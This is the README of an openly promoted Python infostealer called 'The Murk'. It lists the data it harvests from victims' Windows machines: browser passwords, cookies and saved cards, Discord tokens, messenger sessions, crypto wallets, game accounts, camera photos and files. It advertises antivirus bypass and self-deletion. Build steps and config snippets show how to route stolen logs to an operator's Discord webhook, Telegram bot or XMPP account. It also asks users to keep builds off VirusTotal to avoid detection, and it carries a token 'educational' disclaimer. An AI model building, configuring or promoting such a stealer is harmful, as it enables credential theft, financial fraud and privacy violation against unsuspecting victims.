<a id ="up"></a>
![LOGO](Images/pxfulllogo.png)
<img src="https://img.shields.io/badge/Python-FFD43B?style=for-the-badge&logo=python&logoColor=blue">
<img src="https://img.shields.io/badge/VSCode-0078D4?style=for-the-badge&logo=visual%20studio%20code&logoColor=white">
<img src="https://img.shields.io/badge/tests-100/100-76B900?style=for-the-badge&logo=&logoColor=whit">
<img src="https://img.shields.io/badge/license-MIT-blue?style=for-the-badge&logo=&logoColor=whit">
<img src="https://img.shields.io/badge/The%20Murk-v9.2.0-blue?style=for-the-badge&logo=&logoColor=whit">
<img src="https://img.shields.io/badge/platform-windows-989898?style=for-the-badge&logo=&logoColor=whit">


🔐open source turbo🚀 stealer written on Python, all logs will be sent using discord webhooks, telegram bot or XMPP bot.
[Download the latest release](https://github.com/Nick-Vinesmoke/The-Murk-stealer/releases/tag/The_Murk_v9.2.0)

⭐Please, star this repo if it was helpful⭐

***
### ⛔Disclaimer⛔

I, the creator, am __NOT__ responsible for any actions, and or damages, caused by this software. You __BEAR__ the full responsibility of your actions and acknowledge that this software was created for educational purposes only. This software's main purpose is __NOT__ to be used maliciously, or on any system that you do not own, or have the right to use. __By using this software, you automatically agree to the above.__

---
### ❗❗Request❗❗

__Don't upload builded stealer to Virustotal__. The more often you upload it, the more and faster antiviruses begin to recognize its signature.

---
### ❕❕Data grubed❕❕
* ✅System info
    * ❗Main
      * ⏲Time
      * ⌚Timezone
      * 🏙City
      * 🏙Region
      * 🗺Country
      * 👤Username
      * 🖥PC Name
      * 💻OS
      * 💻OS Version
      * ⚙Architecture
      * 🔧HWID
      * 🔧MAC
      * 🛠BIOS Serial Number
      * 🛠Machine GUID
      * 🛠BaseBoard Manufacturer
    * 🌐Network
        * 📡External IP
        * 📡Internal IP
        * 🌍Coordinates
        * 🏬Organization
        * 📯Postal
    * 🔩CPU
        * 📜CPU model
        * 📜Cores
        * 📜CPU frequency
    * 🎥GPU
        * 🔩GPU model
        * 💾All memory in the GPU
        * 💾Free memory in the GPU
        * 💾Used memory in the GPU
        * 📜GPU temperature
    * 💽RAM
        * 💾All RAM
        * 💾Available
        * 💾Used
    * 💽DRIVES
        * 📜volumes
        * 💾All Memory
        * 💾Available
        * 💾Used
        * 📜File system type
    * 🧮OTHER 
      * 🧪Antiviruses
      * 📠Processes
      * 📄Clipboard
      * 📱Programs
      * 🔑Product key
      * 📡Wifi
      * 🗂FileZilla
* ✅Files .txt, .docx, etc
    * 📝in Desktop
    * 📝in Documents
    * 📝in Downloads
* 🪁Messagers
   * 📢Telegram sessions
   * 📢Viber sessions
   * 📢Pidgin sessions
   * 📢Discord sessions + token-grabber + pwd-grabber
   * 📢Skype sessions
   * 📢WhatsApp sessions
   * 📢And more
* ⚔Game
   * ♠Steam
   * ♠Epic Games
   * ♠Uplay
   * ♠Roblox
   * ♠Minecraft
   * ♠BattleNET
   * ♠And more
* 💳Wallets
   * 💵PayPal
   * 💵Kivi
   * 📈Binance
   * 📈Metamask
   * 📈Atomic
   * 💵And more
* 🌐Browsers
    * 🔗Chrome
        * 🔑Passwords
        * 🔐Cookies
        * 📝History
        * 📥Downloads
        * 🧩Extensions
        * 💳Cards
    * 🔗Firefox
        * 🔑Passwords
        * 🔐Cookies
        * 📝History
        * 📥Downloads
        * 🧩Extensions
        * 💳Cards
    * 🔗Opera
        * 🔑Passwords
        * 🔐Cookies
        * 📝History
        * 📥Downloads
        * 🧩Extensions
        * 💳Cards
    * 🔗Edge
        * 🔑Passwords
        * 🔐Cookies
        * 📝History
        * 📥Downloads
        * 🧩Extensions
        * 💳Cards
    * 🔗Brave
        * 🔑Passwords
        * 🔐Cookies
        * 📝History
        * 📥Downloads
        * 🧩Extensions
        * 💳Cards
    * 🔗And more
* 📡VPN
    * ⛓Nord VPN 
    * ⛓Open VPN
    * ⛓Proton VPN
* 📚Other
    * 📸Sreenshot
    * 📸Camera photo
    * 🗃File grabber
    * 🛡Anti-debug
    * 💉AV bypass
    * 🎭Self destruction
---
### 🔨Building(using builder)

### 🎮For Discord
__So firstly you need to download [python](https://www.python.org/downloads/). Then you need to download the builder [here](https://github.com/Nick-Vinesmoke/The-Murk-stealer/releases/tag/The_Murk_v9.2.0). 
After that, you need to create your Discord server and webhook there. [How to do it](https://hookdeck.com/webhooks/platforms/how-to-get-started-with-discord-webhooks#conclusion).
Finally, insert the name and webhook link in the builder. Better use building using pyarmor. And wait, secure building will take about 2 minutes.__

### 📨For Telegram
So firstly, go to the [@BotFather](https://t.me/BotFather) bot and create your own bot. Then, you need to save token and bot name. 
Now you need to get your chat id. To do this, go to the next bot [@ShowJsonBot](https://t.me/ShowJsonBot) and save the id.  
Insert this data in builder console. Better use building using pyarmor. And wait, secure building will take about 2 minutes.

---

### 🔨Building(manually)

### 🎮For Discord
Finally, insert the name and webhook link in the `config\config.py` here
```
enableFileGrabber = False #enable file grabber
oneStart = False #enable this if you want logs to come only from unique computers
avbypass = False #enable antiviruses bypass
selfDestruct = False #deletes itself after stealing
debuging = False #disable AntiDebug (do not change if you do not know what it is responsible for)

sendType = 0 # 0 via Discord; 1 via Telegram; 2 via XMPP
discordData = ["url of your WebHook","name of that WebHook"]
```
and run `CompileNuitka.bat` or `CompilePyarmor.bat` or `CompilePyinstaller.bat`

### 📨For Telegram
Finally, insert the name and webhook link in the `config\config.py` here
```
enableFileGrabber = False #enable file grabber
oneStart = False #enable this if you want logs to come only from unique computers
avbypass = False #enable antiviruses bypass
selfDestruct = False #deletes itself after stealing
debuging = False #disable AntiDebug (do not change if you do not know what it is responsible for)

sendType = 0 # 0 via Discord; 1 via Telegram; 2 via XMPP
TelegramData = ["HTTPAPI that you got from botFather","your chat ID"]
```
and run `CompileNuitka.bat` or `CompilePyarmor.bat` or `CompilePyinstaller.bat`

### 📡For XMPP
Finally, insert the name and webhook link in the `config\config.py` here
```
enableFileGrabber = False #enable file grabber
oneStart = False #enable this if you want logs to come only from unique computers
avbypass = False #enable antiviruses bypass
selfDestruct = False #deletes itself after stealing
debuging = False #disable AntiDebug (do not change if you do not know what it is responsible for)

sendType = 0 # 0 via Discord; 1 via Telegram; 2 via XMPP
xmppData = ["jabberid","jabberpassword","jabberreceiver"]
```
and run `CompileNuitka.bat` or `CompilePyarmor.bat` or `CompilePyinstaller.bat`

---
### ❌Builder errors

If you have error like this:

![error](Images/error.png)

How to solve it read [here](https://www.stechies.com/pip-not-recognized-internal-external-command/)

If you have error like this:

![error](Images/error1.png)

input in cmd `pip uninstall typing` and than input `y`


---
### 🧾Results(logs)
Example of message in Discord

![LOGO](Images/example1.png)

![LOGO](Images/example.png)

---
### 💰 Donate
   <a href="https://www.donationalerts.com/r/nick_vinesmoke"><img src="https://img.shields.io/badge/Donationalerts-F37623?style=for-the-badge&logo=Cash%20App&logoColor=white"></a>
   <a href="https://patreon.com/NickVinesmoke"><img src="https://img.shields.io/badge/Patreon-F96854?style=for-the-badge&logo=patreon&logoColor=white"></a>
   
  BTC: <code>bc1qfe46xsewu00yhl0llzaxhz9re03y4al0w9p3v2</code>
  
  ETH: <code>0xeeA063838950D191881EdF0E31b4699B73aD20Ac</code>
  
  XMR: <code>48jeXS4GGpEJ2Kswn3zRXc3wBqK2s9ojJEohE47KW9ZMPdtnCGTTJGjc7iQpNWSrmmZCCLsj4WDNVa88Mb6kTeJhJWbtbmo</code>

  USDT: <code>0xeeA063838950D191881EdF0E31b4699B73aD20Ac</code>

  LTC: <code>LWyarn3cnVyVahgjDpr4uokCFQbq39KDuc</code>

---
### 📲Contacts
open [issues](https://github.com/Nick-Vinesmoke/The-Murk-stealer/issues), [pull requests](https://github.com/Nick-Vinesmoke/The-Murk-stealer/pulls) or [discussions](https://github.com/Nick-Vinesmoke/The-Murk-stealer/discussions)

or 

<a href="https://github.com/Nick-Vinesmoke"><img src="https://img.shields.io/badge/GitHub-100000?style=for-the-badge&logo=github&logoColor=white"></a>
   <a href="https://discord.gg/ufvyg5F2j4"><img src="https://img.shields.io/badge/Discord-003E54?style=for-the-badge&logo=Discord&logoColor=white"></a>
   
Our Discord server <a href="https://discord.gg/ufvyg5F2j4">join us</a>

---
[go up](#up)
